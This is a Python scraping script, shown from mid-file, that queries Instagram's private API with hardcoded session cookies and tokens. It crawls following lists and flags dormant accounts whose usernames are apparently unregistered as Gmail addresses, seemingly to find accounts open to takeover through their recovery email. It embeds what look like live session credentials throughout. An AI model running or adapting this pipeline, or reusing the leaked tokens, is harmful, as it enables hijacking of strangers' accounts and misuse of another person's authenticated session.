qSXM4emdFUkpDVnFPb3QxbExqRElRUUU3YkQxYVhzWkJFakMwWkQiLCJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImlzc3VlZF9hdCI6MTY4MjgyMDMyNn0; rur="NCG\\05458603175168\\0541714356380:01f7786dfa41c63b8c68d52e2ee5a433447d836296e4bc4a474bf3c62402d665e8ad5b09"',
        'referer': 'https://www.instagram.com/atneriheenney/',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.137", "Google Chrome";v="112.0.5615.137", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'viewport-width': '1792',
        'x-asbd-id': '198387',
        'x-csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': 'hmac.AR3j-GDo7PhBSoIIlQPLGWCe3MS_Ixr-eOD3mLCFCjq8V_rH',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'content_type': 'PROFILE',
        'target_id': id,
    }

    response = requests.get(
        'https://www.instagram.com/api/v1/web/get_ruling_for_content/',
        params=params,
        cookies=cookies,
        headers=headers,
    )
    print(response, response.text[:100])


for _ in range(3):
    silly_following_test(303430959 + _)
    print()

quit()

usernames = [ 
    'lil_manj666',
    'yornecride',
    'yorneamos',
    'yorneason',
    'orinnelaughter',
    'anayihavis',
    'anayihhaw',
    'anayihhites',
    'anayihdwards',
    'anayihzrady',
    'anayihzorman',
    'atibhamith',
    'entleybolbrook',
    'entleyochrane',
    'alvaodrdkins',
    'auricionow',
    'edarroillis',
    'edarroise',
    'edarroerry',
    'edarroerr',
    'edarrorown',
    'edarrouffy',
    'edarroebb',
    'edarroudson',
    'edarrorady',
]

def get_following(instagram, relationship):

    def get_part_of_following(instagram, start, relationship = 'following'):

        cookies = {
            'mid': 'ZBXtIQAEAAGWpHSR7XGgpHbOs4gD',
            'ig_did': '0CB4A17E-64F5-441F-9167-0E9F4EB88F5C',
            'ig_nrcb': '1',
            'datr': 'IO0VZE0tGLIAMSNFMq-HKUM1',
            'fbm_124024574287414': 'base_domain=.instagram.com',
            'dpr': '2',
            'fbsr_124024574287414': 'LKUfB8ZULQ2y0d5nyK5QEneNSIVQY20bLK3zKp0YA3E.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQUJzZ3hkMTdxZXQ1LThTeUFoTnZIaTBhRE9uVzJHbHRwamNhOVNFcGZiQU1Henp6NkptUjFlblF0Szhvd0h5VzF3T084bDlRNnNWOUliMjI3NElFTkdkQVJJa0l2SXJvZzBfUTctWjJ5X1k5VzdzT0RDTE40M3Z1SGdYRTBUWWJ3RFMwUlFWNHpTUWFScUtia0pBcHAzUGtueE43WkFCV3R0SE1uX1BRYUdTY0REenlncWlxbDluMzZDVkZHRzVSTVF6M1VuY2pxX2pCQzFuM1llLU1XNjFMQzVWRmhpM01uUjNfQVNzY1ZwQnpWUkNPUHA1UW9vakVMRlE1V2YtNUIwa0czcy1DTDFGajkyTXJDOHNfWGVzdUhLekw2WDhNYktkTUVPRWRTZUFmMHFuNTczcDd6algtajBZbl9sa0FycTJhS1R5Y3RwLTJJYWJtTVhiTHBaIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxHdU5JYUFVWkNiRFFkTHJDYjVaQUlFZTd1dmlVSGtTNkZnNHA0NG04YmlGaVBLVjNtbWNtb2FUbEI2WXJCNVBxT1pCTlpBNVdmNUd1R1lQR3ZjZEhpc0hzTEoya2JXTmVFMUxxT3dSeVFwRnhGVk1JdnJUMnZJTzdEeTlrd1JWWWdvNTVRVkNWVzZMUEdoT1ZkRHlsaFkxR0h6bWFybndxQjRFTzdPVjlIMmJ6ZUdDZ3daRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgyODE1MDM5fQ',
            'ds_user_id': '58603175168',
            'sessionid': '58603175168%3Asv2ODVlrx539vv%3A27%3AAYf8JTJzhpnWAB_6mTF-r7W0IWya-uBhzHcNexxxZw',
            'csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
            'shbid': '"12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"',
            'shbts': '"1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"',
            'fbsr_124024574287414': 'LKUfB8ZULQ2y0d5nyK5QEneNSIVQY20bLK3zKp0YA3E.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQUJzZ3hkMTdxZXQ1LThTeUFoTnZIaTBhRE9uVzJHbHRwamNhOVNFcGZiQU1Henp6NkptUjFlblF0Szhvd0h5VzF3T084bDlRNnNWOUliMjI3NElFTkdkQVJJa0l2SXJvZzBfUTctWjJ5X1k5VzdzT0RDTE40M3Z1SGdYRTBUWWJ3RFMwUlFWNHpTUWFScUtia0pBcHAzUGtueE43WkFCV3R0SE1uX1BRYUdTY0REenlncWlxbDluMzZDVkZHRzVSTVF6M1VuY2pxX2pCQzFuM1llLU1XNjFMQzVWRmhpM01uUjNfQVNzY1ZwQnpWUkNPUHA1UW9vakVMRlE1V2YtNUIwa0czcy1DTDFGajkyTXJDOHNfWGVzdUhLekw2WDhNYktkTUVPRWRTZUFmMHFuNTczcDd6algtajBZbl9sa0FycTJhS1R5Y3RwLTJJYWJtTVhiTHBaIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxHdU5JYUFVWkNiRFFkTHJDYjVaQUlFZTd1dmlVSGtTNkZnNHA0NG04YmlGaVBLVjNtbWNtb2FUbEI2WXJCNVBxT1pCTlpBNVdmNUd1R1lQR3ZjZEhpc0hzTEoya2JXTmVFMUxxT3dSeVFwRnhGVk1JdnJUMnZJTzdEeTlrd1JWWWdvNTVRVkNWVzZMUEdoT1ZkRHlsaFkxR0h6bWFybndxQjRFTzdPVjlIMmJ6ZUdDZ3daRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgyODE1MDM5fQ',
            'rur': '"NCG\\05458603175168\\0541714351058:01f77beb6261eb53c9e177ddc9665e3b2c077ba7f7995ba24e8f5d8321579562c2ae4a69"',
        }

        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': 'mid=ZBXtIQAEAAGWpHSR7XGgpHbOs4gD; ig_did=0CB4A17E-64F5-441F-9167-0E9F4EB88F5C; ig_nrcb=1; datr=IO0VZE0tGLIAMSNFMq-HKUM1; fbm_124024574287414=base_domain=.instagram.com; dpr=2; fbsr_124024574287414=LKUfB8ZULQ2y0d5nyK5QEneNSIVQY20bLK3zKp0YA3E.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQUJzZ3hkMTdxZXQ1LThTeUFoTnZIaTBhRE9uVzJHbHRwamNhOVNFcGZiQU1Henp6NkptUjFlblF0Szhvd0h5VzF3T084bDlRNnNWOUliMjI3NElFTkdkQVJJa0l2SXJvZzBfUTctWjJ5X1k5VzdzT0RDTE40M3Z1SGdYRTBUWWJ3RFMwUlFWNHpTUWFScUtia0pBcHAzUGtueE43WkFCV3R0SE1uX1BRYUdTY0REenlncWlxbDluMzZDVkZHRzVSTVF6M1VuY2pxX2pCQzFuM1llLU1XNjFMQzVWRmhpM01uUjNfQVNzY1ZwQnpWUkNPUHA1UW9vakVMRlE1V2YtNUIwa0czcy1DTDFGajkyTXJDOHNfWGVzdUhLekw2WDhNYktkTUVPRWRTZUFmMHFuNTczcDd6algtajBZbl9sa0FycTJhS1R5Y3RwLTJJYWJtTVhiTHBaIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxHdU5JYUFVWkNiRFFkTHJDYjVaQUlFZTd1dmlVSGtTNkZnNHA0NG04YmlGaVBLVjNtbWNtb2FUbEI2WXJCNVBxT1pCTlpBNVdmNUd1R1lQR3ZjZEhpc0hzTEoya2JXTmVFMUxxT3dSeVFwRnhGVk1JdnJUMnZJTzdEeTlrd1JWWWdvNTVRVkNWVzZMUEdoT1ZkRHlsaFkxR0h6bWFybndxQjRFTzdPVjlIMmJ6ZUdDZ3daRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgyODE1MDM5fQ; ds_user_id=58603175168; sessionid=58603175168%3Asv2ODVlrx539vv%3A27%3AAYf8JTJzhpnWAB_6mTF-r7W0IWya-uBhzHcNexxxZw; csrftoken=f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0; shbid="12360\\05458603175168\\0541714351046:01f7506e1801a5fa2a0effcc20b7d3a05ce7a12d21e1b9ab11e35c5e29c492f1280703a1"; shbts="1682815046\\05458603175168\\0541714351046:01f7901ec35e9a41be3096eb73be2785099a7d2517ba0c438923a01b5a966c98623babe2"; fbsr_124024574287414=LKUfB8ZULQ2y0d5nyK5QEneNSIVQY20bLK3zKp0YA3E.eyJ1c2VyX2lkIjoiMTAwMDkwMDI0ODE4MzYxIiwiY29kZSI6IkFRQUJzZ3hkMTdxZXQ1LThTeUFoTnZIaTBhRE9uVzJHbHRwamNhOVNFcGZiQU1Henp6NkptUjFlblF0Szhvd0h5VzF3T084bDlRNnNWOUliMjI3NElFTkdkQVJJa0l2SXJvZzBfUTctWjJ5X1k5VzdzT0RDTE40M3Z1SGdYRTBUWWJ3RFMwUlFWNHpTUWFScUtia0pBcHAzUGtueE43WkFCV3R0SE1uX1BRYUdTY0REenlncWlxbDluMzZDVkZHRzVSTVF6M1VuY2pxX2pCQzFuM1llLU1XNjFMQzVWRmhpM01uUjNfQVNzY1ZwQnpWUkNPUHA1UW9vakVMRlE1V2YtNUIwa0czcy1DTDFGajkyTXJDOHNfWGVzdUhLekw2WDhNYktkTUVPRWRTZUFmMHFuNTczcDd6algtajBZbl9sa0FycTJhS1R5Y3RwLTJJYWJtTVhiTHBaIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUxHdU5JYUFVWkNiRFFkTHJDYjVaQUlFZTd1dmlVSGtTNkZnNHA0NG04YmlGaVBLVjNtbWNtb2FUbEI2WXJCNVBxT1pCTlpBNVdmNUd1R1lQR3ZjZEhpc0hzTEoya2JXTmVFMUxxT3dSeVFwRnhGVk1JdnJUMnZJTzdEeTlrd1JWWWdvNTVRVkNWVzZMUEdoT1ZkRHlsaFkxR0h6bWFybndxQjRFTzdPVjlIMmJ6ZUdDZ3daRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgyODE1MDM5fQ; rur="NCG\\05458603175168\\0541714351058:01f77beb6261eb53c9e177ddc9665e3b2c077ba7f7995ba24e8f5d8321579562c2ae4a69"',
            'referer': 'https://www.instagram.com/throck/following/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.137", "Google Chrome";v="112.0.5615.137", "Not:A-Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'viewport-width': '1792',
            'x-asbd-id': '198387',
            'x-csrftoken': 'f1pHOXaoNlkyDBnWb3Qny7wjfpNIxmR0',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3T24zTBrAocWPHWdKcr7KMSB7XrdkyqICzGYB_rpLAZJ9m',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'count': 200,
            'max_id': start,
        }

        response = requests.get(
            f'https://www.instagram.com/api/v1/friendships/{get_id(instagram)}/{relationship}/',
            params=params,
            cookies=cookies,
            headers=headers,
        ) 
        # print(response, response.text)

        json = response.json()
        print(len(json['users']))

        following = [user['username'] for user in json['users']]

        def sift_user(i):
            user = json['users'][i]
            if user['username'] == 'akailaleflore196798': print('hihi')
            if (user['username'][:min(len(user['full_name']), len(user['username']))] == user['full_name']) and len(user['full_name']) >= 5 and str(user["latest_reel_media"]) == '0':
                print(user['username'])
                global usernames
                if user['username'] not in usernames:

                    def test_backup(tries = 0):
                        if tries == 3: return False
                        try:
                            res = backup_email(user['username'])
                            if res == 429: return test_backup(tries = tries+1)
                            return res
                        except:
                            return test_backup(tries = tries+1)

                    def test_available(tries = 0):
                        if tries == 3: return False
                        try:
                            return available_gmail(user['username'])
                        except:
                            return test_available(tries = tries+1)
                    
                    
                    if test_backup() and test_available(): 
                        print("VALID", user['username'])
                        usernames.append(user['username'])
                        print('USERNAMES APPENDED', usernames)
        
        proc = []
        for i in range(len(json['users'])):
            p = Process(target=sift_user, args=(i,))
            proc.append(p)
            p.start()
        for p in proc:
            p.join()

        return following
        # except:
        #     # print('b')
        #     return []

    following = []
    ship = []
    prev = -1
    i = 0
    j = 0
    while len(following) != prev:
        prev = len(following)
        print(len(following))
        following += [f for f in get_part_of_following(instagram, start = 200*i, relationship = relationship) if f not in following]
        print(len(following))
        i += 1

i=0
def add_more_names():
    global i
    while i < len(usernames):
        # print('followers')
        # get_following(usernames[i], 'followers')
        print('following')
        get_following(usernames[i], 'following')
        i+=1
        print(i, len(usernames), 'usernames', usernames)




start = time.time()
add_more_names()
end = time.time()
print(end - start)